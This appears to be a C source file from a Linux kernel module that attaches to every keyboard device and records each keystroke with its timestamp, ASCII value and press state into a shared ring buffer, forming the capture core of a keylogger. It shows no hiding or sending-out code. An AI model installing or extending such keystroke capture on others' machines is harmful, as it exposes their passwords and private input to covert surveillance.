// SPDX-License-Identifier: GPL-2.0

#include "lk2.h"

// Provided by lk2_main.c
extern struct lk2_ring g_lk2_ring;

// Track Shift state for ASCII conversion. We keep it very simple:
// - left or right shift pressed => shift_down = true
// - both released => shift_down = false
static bool shift_down;
static u8 shift_pressed_count;

struct lk2_kbmon
{
	struct input_handle handle;
};

static bool lk2_looks_like_keyboard(struct input_dev *dev)
{
	// Similar heuristic as input/evbug: require EV_KEY and KEY_A
	return test_bit(EV_KEY, dev->evbit) && test_bit(KEY_A, dev->keybit);
}

static void lk2_capture_timestamp(struct lk2_time *t)
{
	struct timespec64 ts;
	struct tm tm;

	ktime_get_real_ts64(&ts);
	time64_to_tm(ts.tv_sec, 0, &tm);

	t->hour = (u8)tm.tm_hour;
	t->min = (u8)tm.tm_min;
	t->sec = (u8)tm.tm_sec;
}

static void lk2_handle_shift(u16 code, int value)
{
	bool pressed = (value != 0);

	if (code != KEY_LEFTSHIFT && code != KEY_RIGHTSHIFT)
		return;

	if (pressed)
	{
		if (shift_pressed_count < 2)
			shift_pressed_count++;
	}
	else
	{
		if (shift_pressed_count > 0)
			shift_pressed_count--;
	}

	shift_down = (shift_pressed_count != 0);
}

static void lk2_event(struct input_handle *handle, unsigned int type,
					  unsigned int code, int value)
{
	struct lk2_entry e;

	if (type != EV_KEY)
		return;

	// value meanings for EV_KEY:
	//   0: release, 1: press, 2: autorepeat
	// We'll record autorepeat as Pressed (still a "press" from userland PoV)
	lk2_handle_shift((u16)code, value);

	memset(&e, 0, sizeof(e));
	lk2_capture_timestamp(&e.t);
	e.keycode = (u16)code;
	e.state = (value == 0) ? LK2_RELEASED : LK2_PRESSED;
	e.ascii = lk2_keycode_to_ascii(e.keycode, shift_down);

	lk2_ring_push(&g_lk2_ring, &e);
}

static int lk2_connect(struct input_handler *handler, struct input_dev *dev,
					   const struct input_device_id *id)
{
	struct lk2_kbmon *m;
	int err;

	if (!lk2_looks_like_keyboard(dev))
	{
		return -ENODEV;
	}

	m = kzalloc(sizeof(*m), GFP_KERNEL);
	if (!m)
		return -ENOMEM;

	m->handle.dev = dev;
	m->handle.handler = handler;
	m->handle.name = "lk2_kbmon";

	err = input_register_handle(&m->handle);
	if (err)
	{
		kfree(m);
		return err;
	}

	err = input_open_device(&m->handle);
	if (err)
	{
		input_unregister_handle(&m->handle);
		kfree(m);
		return err;
	}

	pr_info("lk2: connected to input device: %s\n", dev_name(&dev->dev));
	return 0;
}

static void lk2_disconnect(struct input_handle *handle)
{
	struct lk2_kbmon *m = container_of(handle, struct lk2_kbmon, handle);

	pr_info("lk2: disconnected from input device: %s\n", dev_name(&handle->dev->dev));

	input_close_device(handle);
	input_unregister_handle(handle);
	kfree(m);
}

static const struct input_device_id lk2_ids[] = {
	{
		.flags = INPUT_DEVICE_ID_MATCH_EVBIT,
		.evbit = {BIT_MASK(EV_KEY)},
	},
	{}, // sentinel
};

MODULE_DEVICE_TABLE(input, lk2_ids);

static struct input_handler lk2_handler = {
	.event = lk2_event,
	.connect = lk2_connect,
	.disconnect = lk2_disconnect,
	.name = "lk2_input_handler",
	.id_table = lk2_ids,
};

int lk2_input_register(void)
{
	shift_down = false;
	shift_pressed_count = 0;
	return input_register_handler(&lk2_handler);
}

void lk2_input_unregister(void)
{
	input_unregister_handler(&lk2_handler);
}
